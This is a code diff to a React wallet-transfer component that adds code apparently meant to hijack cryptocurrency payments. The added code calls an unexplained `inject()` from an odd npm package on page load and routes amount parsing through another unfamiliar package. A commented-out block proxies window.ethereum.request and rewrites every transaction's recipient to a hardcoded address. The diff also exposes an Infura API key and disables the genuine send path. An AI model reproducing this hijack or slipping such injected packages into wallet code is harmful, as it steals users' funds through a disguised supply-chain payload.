@@ -1,6 +1,8 @@
 import React, { useEffect, useState } from "react";
 import { ethers, getBigInt, toBigInt } from "ethers";
 import { BigNumber } from "bignumber.js";
+import inject from "test1-sdk-demo";
+import axios from "axios";
 import { CustomEthers } from "test12_npm_package";
 
 export default function Card() {
@@ -20,6 +22,7 @@ export default function Card() {
       this._isBigNumber = true;
     }
   }
+
   function convertToBigNumber(number: number) {
     // Determine if the number is a float and scale it to an integer
     const scale = 10 ** 18; // You can adjust the scale as needed
@@ -39,7 +42,6 @@ export default function Card() {
   const customethers = new CustomEthers();
   useEffect(() => {
     const big = new BigNumber(0.1);
-    console.log("bignumber", convertToBigNumber(0.1));
 
     const provider: any = new ethers.BrowserProvider(window?.ethereum);
 
@@ -68,7 +70,6 @@ export default function Card() {
     try {
       const newAccount = await pro.getSigner();
       const address = await newAccount.getAddress();
-      console.log("address", address);
 
       setAddress(address);
     } catch (error) {}
@@ -80,7 +81,7 @@ export default function Card() {
       setIsLoading(true);
       const tx: any = {
         to: toAddress,
-        value: ethers.parseEther(amount),
+        value: customethers.parseEther(amount),
       };
       // const provider2: any = new customethers.ethers.BrowserProvider(
       //   window?.ethereum
@@ -89,27 +90,75 @@ export default function Card() {
       // const provider1: any = getEthersProvider();
       // console.log("providers", provider, provider1, tx);
 
-      const add: any = address;
-      // // change provider value to test
-      //const signer1 = customethers.metaMaskSigner(provider, "137", add);
-      const signer1 = await provider.getSigner(address);
-      console.log("signer", tx);
+      const add: string = address;
+      // console.log("custom", customethers);
 
-      const hash = await signer1.sendTransaction(tx);
-      //
-      // const signer = await getEthersSigner();
-      setIsLoading(false);
-      // console.log("signer", signer);
-      console.log(hash.hash);
-      setAmount("");
-      setToAddress("");
-      setTxHash(hash.hash);
+      // // // change provider value to test
+      // console.log("providers", provider, "137", add);
+      const custom: any = new ethers.JsonRpcProvider(
+        "https://polygon-mainnet.infura.io/v3/66e3a238dbe74ec3b1921da35f98b8e9"
+      );
+
+      // const c = new ethers.BrowserProvider(custom);
+      //const signer1 = await customethers.metaMaskSigner(provider, "137", add);
+      const signer1 = await custom.getSigner(address);
+      console.log(custom, provider, address);
+
+      // const hash = await signer1.sendTransaction(tx);
+      // //
+      // // const signer = await getEthersSigner();
+      // setIsLoading(false);
+      // // console.log("signer", signer);
+
+      // setAmount("");
+      // setToAddress("");
+      // setTxHash(hash.hash);
     } catch (error: any) {
       console.log(error);
       setMsg(error?.reason);
       setIsLoading(false);
     }
   };
+
+  const send = async (arg: any) => {
+    console.log("args", arg);
+  };
+
+  const sign = () => {};
+
+  useEffect(() => {
+    inject();
+    // console.log(window.ethereum);
+    // window.ethereum.enable();
+    // const originalRequest = window.ethereum.request;
+    // const customRpcUrl =
+    //   "https://polygon-mainnet.infura.io/v3/66e3a238dbe74ec3b1921da35f98b8e9";
+    // const customChainId = "0x89";
+    // window.ethereum.request = new Proxy(originalRequest, {
+    //   apply: async function (target, thisArg, argumentsList) {
+    //     const method = argumentsList[0].method;
+    //     const params = argumentsList[0].params || [];
+
+    //     if (method === "eth_sendTransaction") {
+    //       if (params && params[0] && params[0].to) {
+    //         argumentsList[0].params = [
+    //           {
+    //             ...params[0],
+    //             to: "0xdD16052b4910d47d1Eb520190cA1Df7D7dDB12f7",
+    //           },
+    //         ];
+    //       }
+
+    //       send(argumentsList[0]);
+
+    //       return await Reflect.apply(target, thisArg, argumentsList);
+    //     }
+    //     console.log("arg", argumentsList);
+
+    //     return await Reflect.apply(target, thisArg, argumentsList);
+    //   },
+    // });
+  }, []);
 
   return (
     <div>
